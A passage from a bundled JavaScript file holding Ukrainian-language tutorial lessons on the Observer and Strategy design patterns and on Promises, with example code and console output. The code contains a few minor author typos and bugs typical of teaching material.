**~observer~** сповіщатиме про зміну даних:\n\n~~~js\nobserver.subscribe(createSubscriber('topic', 'h3')),\nobserver.subscribe(createSubscriber('message', 'p')),\nobserver.subscribe(createSubscriber('author', 'small'))\n~~~\n\nТепер при зміні значень у полях _~input~_ створені підписники реактивно оновлюватимуться.\n\n_____________________________________\n\nЯкщо \"підписати\" на оновлення даних моделі метод console.log:\n\n~~~js\nobserver.subscribe(outputDevice.write)\n~~~\n\nто зміни відображатимуться не лише на сторінці, а й у консолі.\n\nВнаслідок спроби створити підписника без передачі аргументу:\n\n~~~js\nobserver.subscibe(null)\n~~~\n\nми отримаємо повідомлення від оглядача:\n\n••Invalide subscriber••\n\n_________________________________________\n\n### ![ico-25 slider-button] Demo 1\n\n{{{pattern-observer.js}}}\n____________________________________________________\n\n### ![ico-25 icon] Повний фрагмент коду\n\n~~~~js\nconst inputs = ['topic', 'message', 'author']\n\nconst addElem = (tag = 'input', container = section) => (container.nodeType === 1 ? container : section)\n  .appendChild(document.createElement(tag))\n\nObject.assign(addElem('style'), {\n  textContent: `\n    input {\n      display: block;\n      padding: 4px 12px;\n      margin-left: 16px;\n    }\n  `\n})\n\nconst observed = inputs  \n  .map(item => {\n    const elem = Object.assign(addElem(), {\n      id: item,\n      innerText: item,\n      placeholder: item\n    })\n    return elem\n  })\n\nfunction createSubscriber (prop, tagName, container = section) {\n  const elem = container.appendChild(document.createElement(tagName))\n  return function update (data) {\n    data[prop] && Object.assign(elem, {\n      innerText: data[prop]\n    })\n  }\n}\n\nclass Observer {\n  constructor (subjects) {\n    Object.assign(this, {\n      subscribers: [],\n      events: subjects.map(function (elem) {\n        elem.oninput = function (event) {\n          this.broadcast({ [elem.id]: event.target.value })\n        }.bind(this)\n        return elem.oninput\n      }, this)\n    })\n  }\n\n  subscribe (client) {\n    typeof client === 'function'\n      ? this.subscribers.push(client)\n      : console.error('Invalide subscriber: ' + client)\n  }\n\n  unsubscribe (client) {\n    this.subscribers = this.subscribers.filter(subscriber !== client)\n  }\n\n  broadcast (data) {\n    this.subscribers.forEach(client => client(data))\n  }\n}\n\nconst observer = new Observer(observed)\n\nobserver.subscribe(createSubscriber('topic', 'h3')),\nobserver.subscribe(createSubscriber('message', 'p')),\nobserver.subscribe(createSubscriber('author', 'small'))\n~~~~\n\n____________________________________________________\n\n## ![ico-30 cap] Example 2\n\nЗмінимо постановку задачі.\nІніціатором зміни значень даних моделі не завжди є користувач.\nТобто у нашому розпорядженні не буде елементів форм із такою зручною властивістю ~onchange~.\n\nПрипустимо, що слід відстежувати зміну значень елементів масиву ~observed~:\n\n~~~js\nconst observed = ['topic', 'message', 'author']\n~~~\n\nФункцію **~createSubscriber~** можна запозичити з попереднього прикладу, а ось клас **~Observer~** дещо зміниться.\n\n### ![ico-25 cap] Class Observer\n\n~~~js\nclass Observer {\n  constructor (subjects) {\n    Object.assign(this, {\n      subjects: {\n        oldValues: JSON.parse(JSON.stringify(subjects)),\n        newValues: subjects\n      },\n      subscribers: []\n    })\n\n    this.check()\n  }\n\n  check () {\n    const modified = this.subjects.newValues.filter((item, index) => item !== this.subjects.oldValues[index])\n    if (modified.length) {\n      this.subjects.oldValues = JSON.parse(JSON.stringify(this.subjects.newValues))\n      this.broadcast(this.subjects.newValues)\n    }\n    requestAnimationFrame(this.check.bind(this))\n  }\n\n  subscribe (client) {\n    typeof client === 'function'\n      ? this.subscribers.push(client)\n      : console.error('Invalide subscriber: ' + client)\n    this.broadcast(this.subjects.newValues)\n  }\n\n  unsubscribe (client) {\n    this.subscribers = this.subscribers.filter(subscriber !== client)\n  }\n\n  broadcast (data) {\n    this.subscribers.forEach(client => client(data))\n  }\n}\n\nconst observer = new Observer(observed)\n~~~\n\nЯк бачите, кожен підписник відстежує окремий елемент масиву.\nПри створенні підписника ми передаємо індекс елемента, що відстежується:\n\n~~~js\nobserver.subscribe(createSubscriber(0, 'h3')),\nobserver.subscribe(createSubscriber(1, 'p')),\nobserver.subscribe(createSubscriber(2, 'small'))\n~~~\n\nПри реєстрації нового підписника йому передається поточне значення елемента масиву, що відстежується.\nЗробимо так, щоб через деякий час значення елементів масиву, що відстежується, змінилися:\n\n~~~js\nconst getRandom = num => Math.max(Math.round(Math.random() * num), 1000)\n\nsetTimeout(() => { observed[0] = 'new topic' }, getRandom(5000))\nsetTimeout(() => { observed[1] = 'new message' }, getRandom(7000))\nsetTimeout(() => { observed[2] = 'new author' }, getRandom(8000))\n~~~\n\nі побачимо, як працює наше рішення.\n\n### ![ico-25 slider-button] Demo 2\n\n{{{pattern-observer-1.js}}}\n"},63023:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 study] Design Patterns\n\n_____________________________________\n\n### ![ico-20 icon] Strategy\n\nЦе поведінковий патерн.\n\nВін дозволяє описати кілька стратегій поведінки об'єкта з можливістю вибору потрібної стратегії.\n\n_______________________________\n\nСпочатку створимо кілька допоміжних модулів, які можна потім імпортувати в головний модуль класу.\n\n^^^[helpers/validStrategyNames.js]\n~~~js\nexport const validStrategyNames = [\n  'sum-of-all-numeric-fields',\n  'array-field-length',\n  'key'\n]\n~~~\n^^^\n\nСтворимо допоміжні функції ~strategyError~, ~dataError~, ~keyError~, ~keyPropError~, ~arrayFieldError~:\n\n^^^[helpers/strategyError.js]\n~~~js\nexport function strategyError () {\n  const stack = `\n    Valid strategy names:<br>\n      • sum-of-all-numeric-fields<br>\n      • array-field-length<br>\n      • key (key name should be third argument.)\n  `\n  throw Object.assign(new Error('Invalid strategy.'), {\n    name: 'Invalid strategy.',\n    message: 'First argument should be the name of strategy.',\n    stack\n  })\n}\n~~~\n^^^\n\n^^^[helpers/dataError.js]\n~~~js\nexport function dataError () {\n  throw Object.assign(new Error('Sorting error'), {\n    name: 'Source data error.',\n    message: 'Invalid source data.',\n    stack: 'Source data should be the array of objects.'\n  })\n}\n~~~\n^^^\n\n^^^[helpers/keyError.js]\n~~~js\nexport function keyError () {\n  throw Object.assign(new Error('Sorting error'), {\n    name: 'Sorting key error.',\n    message: 'Empty key field.',\n    stack: 'Third argument should be the name of key field.'\n  })\n}\n~~~\n^^^\n\n^^^[helpers/keyPropError.js]\n~~~js\nexport function keyPropError (key) {\n  throw Object.assign(new Error('Sorting error'), {\n    name: 'Sorting error.',\n    message: `Invalid key ${key}.`,\n    stack: `There is no prop  in source data.`\n  })\n}\n~~~\n^^^\n\n^^^[helpers/arrayFieldError.js]\n\n~~~js\nexport function arrayFieldError (key) {\n  throw Object.assign(new Error('Sorting error'), {\n    name: 'Sorting error.',\n    message: `Invalid key ${key}.`,\n    stack: `There is no prop  in source data.`\n  })\n}\n~~~\n^^^\n____________________________________\n\n^^^[helpers/testStrategy.js]\n~~~js\nimport { validStrategyNames } from './validStrategyNames'\nimport { strategyError } from './strategyError'\nimport { dataError } from './dataError'\nimport { keyError } from './keyError'\nimport { keyPropError } from './keyPropError'\nimport { arrayFieldError } from './arrayFieldError'\n\nexport function testStrategy (strategyName, data, key) {\n  if (!validStrategyNames.includes(strategyName)) return strategyError()\n\n  if (!Array.isArray(data)) return dataError()\n\n  if (strategyName === 'key' && !key) return keyError()\n\n  if (strategyName === 'key' && !data.filter(record => record[key]).length) {\n    return keyPropError(key)\n  }\n\n  if (strategyName === 'array-field-length') {\n    const err = data\n      .filter(record => Object.keys(record).filter(key => Array.isArray(record[key]).length))\n      .length\n\n    if (err) arrayFieldError()\n  }\n}\n~~~\n^^^\n____________________________________\n\nСтворимо клас **SortStrategy**.\nПримірник цього класу сортуватиме отриманий масив об'єктів відповідно до зазначеної стратегії.\nУ цьому прикладі екземпляр може використовувати три стратегії сортування:\n\n| **key** | сортування за заданим ключем.<br>^^Кожен елемент масиву (об'єкт) повинен мати властивість із відповідною назвою.^^ |\n| **sum-of-all-numeric-fields** | сортування за сумою всіх числових властивостей об'єкта.<br>^^Усі числові властивості об'єкта, що є елементом вихідного (сортованого) масиву, сумуватимуться.<br>Сортування вихідного масиву виконуватиметься за сумою числових властивостей об'єктів.^^ |\n| **array-field-length** | сортування за довжиною властивості-масиву.<br>^^Усі об'єкти, що є елементами вихідного (сортованого) масиву, повинні мати властивість-масив.<br>Сортування вихідного масиву виконуватиметься за довжиною масиву-властивості.^^ |\n\nПеремикання з однієї стратегії в іншу відбувається за рахунок зміни властивості **valueOf** кожного елемента вихідного масиву.\n\n^^^[class SortStrategy]\n~~~js\nimport { testStrategy } from './helpers/testStrategy'\n\nclass SortStrategy  {\n  constructor () {\n    Object.assign(this, {\n      strategy: null,\n      testStrategy\n    })\n  }\n\n  sort (algorithm, data, key) {\n    this.testStrategy(algorithm, data, key)\n\n    this[algorithm](data)\n\n    data.forEach((record, index, arr) => {\n      let current = index, prev = index\n      while (--prev >= 0) {\n        if (arr[current] + 0 < arr[prev] + 0) {\n          ;[arr[prev], arr[current]] = [arr[current], arr[prev]]\n          current = prev\n        }\n      }\n    })\n  }\n\n  'sum-of-all-numeric-fields' (arrayOfObjects) {\n    return arrayOfObjects\n      .map(item => item.valueOf = function () {\n         return Object.keys(this)\n           .reduce((res, prop) => res += Number(this[prop]) || 0, 0)\n      })\n  }\n\n  'array-field-length' (arrayOfObjects) {\n    return arrayOfObjects\n      .map(item => item.valueOf = function () {\n        const propName = Object.keys(this)\n          .find(prop => Array.isArray(this[prop]))\n        return this[propName].length\n      })\n  }\n\n  'key' (arrayOfObjects, keyField) {\n    return arrayOfObjects\n      .map((item, index, array) => Object.assign(array[index], {\n        valueOf () { return this[keyField] }\n      }))\n  }\n}\n~~~\n^^^\n\nТепер займемося вихідними даними. Будемо використовувати три масиви об'єктів із різним набором властивостей.\n\n^^^[salary]\n~~~js\nconst salary = [\n  { name: 'Stephan', jan: 5000, fab: 5200, mar: 5800, apr: 4950, may: 4700, jun: 5100, jul: 5300, aug: 5000, sep: 4900, nov: 4800, dec: 5500 },\n  { name: 'Georg', jan: 2000, fab: 2200, mar: 2500, apr: 2550, may: 2400, jun: 2800, jul: 2100, aug: 2000, sep: 2200, nov: 2450, dec: 2700 },\n  { name: 'Mary', jan: 3100, fab: 3200, mar: 3000, apr: 3400, may: 3000, jun: 3300, jul: 3400, aug: 3700, sep: 3800, nov: 3700, dec: 3900 },\n  { name: 'Piter', jan: 2000, fab: 2250, mar: 1800, apr: 1950, may: 2100, jun: 2100, jul: 2700, aug: 2500, sep: 2900, nov: 2800, dec: 4000 },\n  { name: 'Helen', jan: 2000, fab: 2100, mar: 1700, apr: 1900, may: 2000, jun: 2000, jul: 2500, aug: 2000, sep: 2400, nov: 2700, dec: 3500 },\n  { name: 'Michael', jan: 3000, fab: 3200, mar: 2800, apr: 2950, may: 2700, jun: 3100, jul: 3300, aug: 4000, sep: 3900, nov: 3800, dec: 4500 },\n  { name: 'Andry', jan: 2800, fab: 2700, mar: 2800, apr: 2750, may: 2700, jun: 2500, jul: 2800, aug: 2700, sep: 2700, nov: 2800, dec: 3000 }\n]\n~~~\n^^^\n\n^^^[workers]\n~~~js\nconst workers = [\n  { name: 'Stephan', payments: [5000, 5200, 5800, 4950, 4700, 5100, 5300, 5000, 4900, 4800, 5500] },\n  { name: 'Georg', payments: [2000, 2200, 2500, 2550, 2400, 2800, 2100, 2000, 2200] },\n  { name: 'Mary', payments: [900, 700, 1000, 1200, 200, 400, 250] },\n  { name: 'Piter', payments: [1000, 2050, 1800, 700, 300, 500] },\n  { name: 'Helen', payments: [200, 210, 170, 190, 200] },\n  { name: 'Michael', payments: [3000, 3200, 2800, 2950] },\n  { name: 'Andry', payments: [1000, 1000, 900, 950] }\n]\n~~~\n^^^\n\n^^^[users]\n~~~js\nconst users = [\n  { name: 'Stephan', age: 30, works: 7, children: 2 },\n  { name: 'Georg', age: 25, works: 2, children: 1 },\n  { name: 'Mary', age: 34, works: 10, children: 1 },\n  { name: 'Piter', age: 50, works: 25, children: 3 },\n  { name: 'Helen', age: 40, works: 20, children: 3 },\n  { name: 'Michael', age: 38, works: 16, children: 2 },\n  { name: 'Andry', age: 45, works: 20, children: 2 }\n]\n~~~\n^^^\n\nЗалишилося створити екземпляр класу **SortStrategy**:\n~~~js\nconst sortStrategy = new SortStrategy\n~~~\n\nта перевірити, як він працює.\n\n~~~js\nfunction sort (algorithm, data, key) {\n  try {\n    sortStrategy.sort(algorithm, data, key)\n    console.log(data)\n  } catch (error) {\n    console.warn(error)\n  }\n}\n\nsort('sum-of-all-numeric-fields', salary)\nsort('key', users, 'name')\nsort('array-field-length', worker)\n~~~\n\n{{{pattern-strategy.js}}}\n"},92562:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-35 study] Promise\n__________________________________________________________________________________________\n\n## ![ico-30 icon] Конструктор\n\nКонструктор **~Promise~** є **функцією вищого порядку**.\nЦе означає, що конструктор **~Promise~** очікує **функцію** як **обов'язковий аргумент**.\n\n~~~js\nconst promise = new Promise(function (...) {\n  ...\n})\n~~~\n\nЯкщо ви викликаєте конструктор **~Promise~** без аргументу:\n\n~~~js\nconst promise = new Promise ()\n~~~\n\n![ico-20 err] буде викинуто виняток:\n\n~~~error\n    Uncaught TypeError: Promise resolver undefined is not a function\n~~~\n\n__________________________________________________________________________________________\n\n### ![ico-25 icon] Функція-аргумент\n\nФункція-аргумент конструктора **~Promise~** також є **функцією вищого порядку**, тобто її формальні параметри є **функціями**.\n^^Ба більше, її формальні параметри - це **функції зворотного виклику**.^^\n\nФункція-аргумент буде викликана під час створення екземпляра **~Promise~**.\nСпробуємо передати конструктору **~Promise~** без формальних параметрів:\n\n~~~js\nconsole.log('Start')\n\nnew Promise(() => console.log('Promise starts'))\n\nconsole.log('End')\n~~~\n\nЯк бачимо, конструктор **~Promise~** викликав передану йому анонімну функцію.\n\n~~~console\nStart\nPromise starts\nEnd\n~~~\n\nОтже, ми передали конструктору **~Promise~** якусь функцію, а він її викликав.\nПоки що ніякої асинхронності.\n\n_____________________________________\n\n### ![ico-25 icon] Екземпляр\n\nДавайте подивимося, що створює конструктор **~Promise~**:\n\n~~~js\nconst promise = new Promise(() => console.log('Promise starts'))\nconsole.log(promise)\n~~~\n\n~~~console\nPromise starts\n\n▼ Promise {<pending>}\n  ▼ [[Prototype]]: Promise\n    ► catch: ƒ catch()\n    ► constructor: ƒ Promise()\n    ► finally: ƒ finally()\n    ► then: ƒ then()\n      Symbol(Symbol.toStringTag): \"Promise\"\n    ► [[Prototype]]: Object\n    [[PromiseState]]: \"pending\"\n    [[PromiseResult]]: undefined\n~~~\n\nОтже, ми отримали екземпляр, який має властивість ~[[PromiseState]]~ (стан промісу) зі значенням \"pending\" і властивість ~[[PromiseResult]]~ (результат) зі значенням ~undefined~.\n^^Ці властивості можна побачити в консолі дебаггера, проте скрипт не має доступу до них.^^\n\nКрім того, ми бачимо три \"успадковані\" методи: **~then~**, **~catch~** та **~finally~**, які ми розберемо далі.\n\n__________________________________________\n\n### ![ico-25 icon] Статичні методи\n\nДавайте подивимося, які статичні методи є у коструктора **~Promise~**.\n\n~~~js\nconsole.dir(Promise)\n~~~\n\n~~~console\n▼ ƒ Promise()\n  ►  all: ƒ all()\n  ►  allSettled: ƒ allSettled()\n  ► any: ƒ any()\n  length: 1\n  name: \"Promise\"\n  ► prototype: Promise {Symbol(Symbol.toStringTag): 'Promise', then: ƒ, catch: ƒ, finally: ƒ}\n  ► race: ƒ race()\n  ► reject: ƒ reject()\n  ► resolve: ƒ resolve()\n  ► withResolvers: ƒ withResolvers()\n  ► Symbol(Symbol.species): ƒ Promise()\n  ► Symbol(Symbol.species): ƒ Promise()\n    arguments: (...)\n    caller: (...)\n  ► [[Prototype]]: ƒ ()\n~~~\n\nПобачимо, що вони вміють.\n\n~~~js\nconst promise = Promise.resolve('Hello')\nconsole.log(promise)\n~~~\n\n~~~console\n▼ Promise {<fulfilled>: 'Hello'}\n  ► [[Prototype]]: Promise\n    [[PromiseState]]: \"fulfilled\"\n    [[PromiseResult]]: \"Hello\"\n~~~\n\nОк ми отримали екземпляр, стан якого вже не \"~pending~\", а \"**~fulfilled~**\".\nІ результат вже не ~undefined~, а \"**Hello**\".\n\n~~~js\nconst promise = Promise.reject('Access denied.')\nconsole.log(promise)\n~~~\n\n~~~console\n▼ Promise {<rejected>: 'Access denied.'}\n  ► [[Prototype]]: Promise\n    [[PromiseState]]: \"rejected\"\n    [[PromiseResult]]: \"Access denied.\"\n~~~\n\nТепер ми отримали екземпляр, стан якого вже не \"~pending~\", не \"~fulfilled~\", а \"**~rejected~**\".\nІ результат \"**Access denied.**\".\n\nТобто ми отримали якийсь об'єкт, у якого можуть бути різні стани (~[[PromiseState]]~), і який може мати вміст (~[[PromiseResult]]~).\nЦе дуже схоже на закриту коробку, в якій може бути вміст (~[[PromiseResult]]~).\n\nОтже, екземпляр конструктора **~Promise~** перебуватиме в одному з трьох можливих станів:\n\n| **pending** | **fulfilled** | **rejected** |\n| ^^Вмісту ще немає (коробка порожня)^^ | ^^У коробці є результат^^  | ^^У коробці - повідомлення про помилку^^ |\n\n_________________________________________\n\n![ico-35 coffee]\n\nПрипустимо, ви прийшли до кафе, де немає офіціантів, та замовили ![ico-35 egg].\n\nПри цьому на столі перед вами з'явилася коробка, в якій в якийсь момент з'явиться відповідь на замовлення.\nВідповідь з'явиться не відразу, оскільки потрібен час, щоб передати замовлення на кухню.\nВідповідь може бути позитивною, тоді в коробці з'явиться ![ico-35 egg],\nабо ж негативною, якщо в даний момент кухар не може приготувати ![ico-35 egg] через відсутність необхідних інгредієнтів.\n\nПрикол у тому, що ви не можете заглянути в коробку і дізнатися, чи з'явилося там щось, чи ні.\n\nПоки коробка порожня, її стан (~[[PromiseState]]~) буде **~pending~**.\nЯкщо в коробці з'явиться ![ico-35 egg], її стан (~[[PromiseState]]~) стане **~fulfilled~**.\nЯкщо в коробці відмова, то її стан (~[[PromiseState]]~) стане **~rejected~**.\n\n| **~PromiseState~** | **~PromiseResult~** |\n| **~pending~**      | ![ico-25 wait]      |\n| **~fulfilled~**    | ![ico-40 egg]       |\n| **~rejected~**     | ![ico-25 error]     |\n\nТепер треба розібратися з тим, як \"витягнути\" з цього екземпляра значення властивостей ~[[PromiseState]]~ та ~[[PromiseResult]]~.\nУ консолі ми їх бачимо, але для нашого коду ці властивості недоступні.\n\nА їсти хочеться.\n\nДавайте випробуємо прототипні методи, які доступні екземпляру конструктора **~Promise~**.\n\n_______________________________________________________\n\n### ![ico-25 icon] Прототипні методи\n\nКожен екземпляр, створений конструктором **~Promise~**, \"успадковує\" від \"батька\" методи **~then~**, **~catch~** та **~finally~**.\n\nМетоди **~then~** та **~catch~** - це дві \"дірки\" в коробці, через які ми можемо витягти те, що в ній знаходиться.\nДля цього потрібно \"всунути руки\" у ці дірки.\n\nПід \"руками\" маються на увазі **функції**.\n\n![ico-25 warn] Отже, методи **~then~**, **~catch~** та **~finally~** є **функціями вищого порядку**, оскільки їх аргументами мають бути **функції**.\n\nОднак якщо ви передасте методу будь-яке інше значення, що не є функцією, або взагалі не передасте нічого, то виключення не буде, хоча метод не спрацює.\nТобто вираз:\n\n~~~js\nPromise.resolve('Access granted.').then()\n~~~\n\nабо:\n\n~~~js\nPromise.resolve('Access granted.').then(10)\n~~~\n\nбуде рівносильним виразу:\n\n~~~js\nPromise.resolve('Access granted.')\n~~~\n\nЦе логічно, адже завдання методу - передати колбек у **Event Loop**, а якщо нічого передавати, то метод нічого робити не буде.\n\n![ico-25 warn] Методи **~then~**, **~catch~** та **~finally~** повертають екземпляр **~Promise~**.\n\nТобто як тільки ви створили екземпляр **~Promise~**, ви вже не зможете \"вирватися\" із \"зачарованого кола\", тобто. що б ви не робили, результатом завжди буде новий екземпляр **~Promise~**.\n\n#### ![ico-20 icon] catch\n\nФункція, яку ми передамо методу **~catch~**, забере повідомлення про помилку, якщо запит буде відхилено та стан нашої \"коробки\" стане **~rejected~**.\n\n~~~js\nconst promise = Promise.reject('Access denied.')\n~~~\n\n~~~error\n    Uncaught (in promise) Access denied.\n~~~\n\nДавайте поставимося серйозно до обробки винятків.\nДуже погано, якщо під час роботи вашої програми консоль буде червоною від повідомлень про помилку.\n\n☼☼☼ Не змушуйте консоль червоніти за вас ☼☼☼\n\n~~~js\nconst promise = Promise.reject('Access denied.').catch(console.log)\n~~~\n\n~~~console\n    ► Uncaught (in promise) Access denied.\n~~~\n\n#### ![ico-20 icon] then\n\nЧерез дірку **~then~** можна всунути відразу дві руки: одну - за результатом, другу - за повідомленням про помилку:\n\n~~~js\nconsole.log('Start')\nPromise.resolve('Access granted.').then(console.log, console.log)\nPromise.reject('Access denied.').then(console.log, console.log)\nconsole.log('Finish')\n~~~\n\n~~~console\nStart\nFinish\nAccess granted.\nAccess denied.\n~~~\n\n#### ![ico-20 icon] finally\n\nДумаю, із цим методом усе досить просто.\n\n~~~js\nconsole.log('Start')\nPromise.resolve('Access granted.')\n  .then(console.log, console.log)\n  .finally(() => console.log('Finally'))\nPromise.reject('Access denied.').then(console.log, console.log)\nconsole.log('Finish')\n~~~\n\n~~~console\nStart\nFinish\nAccess granted.\nAccess denied.\nFinally\n~~~\n______________________________________________\n\n## ![ico-30 icon] Магічна коробка\n\nОтже, за допомогою конструктора **~Promise~** можна створити магічну коробку з двома дірками.\nЯк ми вже зрозуміли, заглянути в цю коробку \"тут і зараз\" просто неможливо.\nДоступ до її вмісту можливий лише через [►►►**Event Loop**►►►](page/Event-Loop).\nТобто вам доведеться відправити за результатом колбеки, і іншого способу витягти вміст із коробки не існує.\n\nДавайте розберемося, чому саме так.\n\nНасправді екземпляр **~Promise~** працює як \"уловлювач\" для результату асинхронного процесу.\nОскільки ми не знаємо, коли завершиться асинхронний процес, ми не знаємо, коли стан коробки зміниться і в ній з'явиться вміст.\nЯкби коробку можна було відразу відкрити, то, швидше за все, ми побачили б порожню коробку.\nУявіть, що ви \"зависаєте\" біля коробки і чекаєте, коли в ній з'явиться вміст.\nТобто блокуєте стек викликів.\nАле вміст не може з'явитися в коробці, поки стек викликів зайнятий.\nНавіть якщо вже надійшла відповідь сервера, або минув час таймера...\nТобто ви зависнете із порожньою коробкою в руках. При цьому заблокуєте сторінку.\nВисновок: код, який створив екземпляр **~Promise~**, повинен завершити роботу та звільнити стек викликів.\n\nКоли ми передаємо екземпляру **~Promise~** свої колбеки через \"дірки\" **~then~**, **~catch~** та **~finally~**, ми звільняємо стек викликів та даємо можливість коробці отримати необхідний результат. Отримавши результат, коробка передасть його одному з наших колбеків.\n\nТепер повернемось до конструктора.\nМи знаємо, що коли викликаємо конструктор **~Promise~**, треба передати йому певну функцію (точніше, посилання на функцію).\n\n~~~js\nconst promise = new Promise(function (resolve, reject) {\n  ...\n})\n~~~\n\nЦя функція буде одразу викликана.\nАле ця функція має два формальні параметри.\n\nТут у вас має виникнути цілком логічне питання:\nякщо ми передаємо конструктору **~Promise~** посилання на функцію, але не передаємо аргументи для виклику цієї функції, то як конструктор може її викликати?\nАдже під час виклику він має передати їй аргументи?\n\n◘◘![ico-25 coffee] ** 2**◘◘\n~~~js\nconst promise = (function (startTime) {\n  const interval = Math.round(Math.random() * 5000)\n\n  function recurse (callback) {\n    Date.now() - startTime < interval\n      ? requestAnimationFrame(recurse.bind(null, callback))\n      : callback(Date.now() - startTime)\n  }\n\n  return new Promise(resolve => recurse(resolve))\n})(Date.now())\n\npromise.then(console.log)\n~~~\n\nУ цьому прикладі ми бачимо, що колбек **~console.log~** ми передаємо вже після того, як екземпляр **~Promise~** був створений.\nТа й не могли б раніше, оскільки ми використовуємо його метод **~then~** для передачі колбека.\n\nСаме в цьому і полягає магія нашої коробки із двома дірками.\nКоробка сама відправить власні колбеки за результатом у [►►►**Event Loop**►►►](page/Event-Loop).\n\nДавайте подивимося, що станеться, якщо ми створимо екземпляр ~Promise~ набагато раніше, ніж ми повісимо зворотні виклики за допомогою методів **_~then~_** і **_~catch~_**:\n\n~~~js\nvar test = new Promise(resolve => resolve(`Time: ${new Date().getSeconds()}/`))\n~~~\n\nЗачекавши кілька секунд, запустимо код:\n\n~~~js\ntest.then(data => console.log(data, new Date().getSeconds()))\n~~~\n\nУ консолі ми побачимо щось на кшталт:\n\n~~~console\nStart\nEnd\nTime: 24/ 36\n~~~\n\nТобто на момент створення проміса **~test~** було 24 секунди, а коли ми додали колбеки, вже було 36 секунд.\nАле прикол у тому, що, хоча ми \"всунули руки\" в дірку **~then~** на кілька секунд пізніше, магічна коробка зберегла для нас результат, що був отриманий раніше.\n\nУявіть, що ви запустили кілька асинхронних процесів, обзавелися кількома «чарівними коробочками» і поставили їх на полицю.\nВи можете витягти вміст коробок в будь-який час і в будь-якій зручній для вас послідовності.\n\nЩоб проілюструвати це, давайте використаємо анонімну функцію з попереднього прикладу, а тепер дайте їй ім'я **~createPromise~** і трохи змініть її:\n\n~~~js\nfunction createPromise (startTime, title) {\n  const interval = Math.round(Math.random() * 5000)\n  function recurse (callback) {\n    const time = Date.now() - startTime\n    time < interval\n      ? requestAnimationFrame(recurse.bind(null, callback))\n      : callback(`${title}: ${Date.now() - startTime}`)\n  }\n  return new Promise(resolve => recurse(resolve))\n}\n~~~\n\nТепер давайте використаємо його для створення трьох екземплярів **~Promise~**:\n\n◘◘![ico-25 cap] ** 3**◘◘\n~~~js\nconst first = createPromise(Date.now(), 'first')\nconst second = createPromise(Date.now(), 'second')\nconst third = createPromise(Date.now(), 'third')\n\nfirst.then(console.log)\nsecond.then(console.log)\nthird.then(console.log)\n~~~\n\nЯк ми бачимо, резолвяться ці три екземпляри в довільному порядку, залежно від значення випадкової величини **~interval~**, яка визначається в момент створення екземпляра.\n\n{{{promise-03.js}}}\n\nПрипустимо, нам потрібно суворо дотримуватися послідовності виведення: first → second → third.\nДавайте використаємо для цього «чарівні» властивості нашої «коробочки з двома отворами»:\n\n◘◘![ico-25 cap] ** 4**◘◘\n~~~js\nconst first = createPromise(Date.now(), 'first').then(console.log)\nconst second = createPromise(Date.now(), 'second')\nconst third = () => createPromise(Date.now(), 'third').then(console.log)\n\nfirst.then(() => second.then(console.log).then(third))\n~~~\n\n{{{promise-04.js}}}\n\n__________________________________________________________________________________________\n\n## ![ico-25 icon] \"Пакети\" промісів\n\nПродовжуючи вивчати статичні методи конструктора **~Promise~**, ми виявляємо, що крім **~Promise.resolve~** та **~Promise.reject~**, є ще ряд корисних методів, за допомогою яких ми можемо обслуговувати одразу цілі колекції промісів.\nГоловне – щоб ці колекції були **ітерабельними**.\n\nКоли ми запускаємо паралельно кілька асинхронних операцій, ми потрапляємо в стихію колбеків, що повертаються до нас.\n\n@@@@\nУявіть собі тенісний корт і гармата вистрілює кульки зі швидкістю п'ять кульок на секунду, а вам потрібно їх відбивати.<br>А якщо дві гармати? Три гармати?...\n![](illustrations/promise-all.jpg)\n@@@@\n\nБезумовно, проміси полегшують завдання.\nЦі \"магічні коробки\" працюють як \"уловлювачі\" для кульок.\nМи можемо \"витягувати кульки\" з цих \"коробок\" за допомогою методу **~then~**.\n\nВсе ускладнюється, якщо результати цих асинхронних операцій потрібні в заданому порядку.\n\n~~~js\nconst data = ['first', 'second', 'third', 'fourth', 'fifth', 'sixth', 'seventh', 'eighth', 'ninth']\nconst random = num => Math.round(Math.random() * num)\n\nconst promises = data\n  .map(item => new Promise(resolve => setTimeout(() => resolve(item), random(5000))))\npromises.forEach(promise => promise.then(console.log))\n~~~\n\n{{{promise-arrays-01.js}}}\n\nТут явно напрошується якесь рішення такого роду:\n\n~~~js\nconst data = ['first', 'second', 'third', 'fourth', 'fifth', 'sixth', 'seventh', 'eighth', 'ninth']\nconst random = num => Math.round(Math.random() * num)\n\nconst promises = data\n  .map(item => new Promise(resolve => setTimeout(() => resolve(item), random(5000))))\n\nconst results = []\nconst start = Date.now()\npromises\n  .forEach((promise, index) => promise.then(value => { results[index] = { time: Date.now() - start, value } }))\n~~~\n\n{{{promise-arrays-02.js}}}\n\nЦе особливо зручно, якщо результати кількох асинхронних операцій потрібні одночасно.\nМи можемо запустити кілька асинхронних операцій і обробляти отримані дані \"пакетом\", коли вони все завершаться.\n\nОднак у цьому варіанті ми не знаємо, коли масив **~results~** буде готовим.\nТобто потрібен ще один проміс, який резолвиться масивом **~results~** після того, як усі проміси у початковому масиві роззолвяться.\n\n◘◘![ico-25 cap] ** 5**◘◘\n\n~~~js\nconst data = ['first', 'second', 'third', 'fourth', 'fifth', 'sixth', 'seventh', 'eighth', 'ninth']\nconst random = num => Math.round(Math.random() * num)\n\nconst promises = data\n  .map(value => new Promise(resolve => setTimeout(() => resolve({ time: Date.now() - start, value }), random(5000))))\n\nconst results = new Array(promises.length).fill(null)\nconst start = Date.now()\npromises\n  .forEach((promise, index) => promise.then(response => { results[index] = response }))\n\nfunction recurse (resolve) {\n  results.filter(item => !item).length\n    ? setTimeout(recurse.bind(null, resolve), 400)\n    : resolve(results)\n}\n\nconst promise = new Promise(resolve => recurse(resolve))\n\npromise.then(console.log)\n~~~\n\n@@@@\n<br>Отже, далі ми розглядатимемо статичні методи конструктора **~Promise~**, які приймають як аргумент посилання на масив промісів і повертають один проміс.<br>Тобто, давайте «упакуємо» кілька «чарівних коробок» в одну «чарівну скриньку».\n![](illustrations/promises-collection.png)\n@@@@\n\n__________________________________________\n\n### ![ico-20 icon] Promise.all\n\nЭтот метод принимает итерабельную коллекцию промисов, и возвращает один промис, который резолвится массивом результатов тогда, когда все промисы разрезолвятся.\nЧудово те, що порядок слідування відповідей у масиві результатів строго відповідає порядку слідування промісів у вхідному масиві промісів.\n\n◘◘![ico-25 cap] ** 6**◘◘\n\n~~~js\nconst create = (message, time) => new Promise(resolve => setTimeout(() => resolve(message), time))\nconst show = message => document.body.appendChild(document.createElement('p')).innerText = message\n\nconst promises = [\n  create('Hello', 1000),\n  create('Bye', 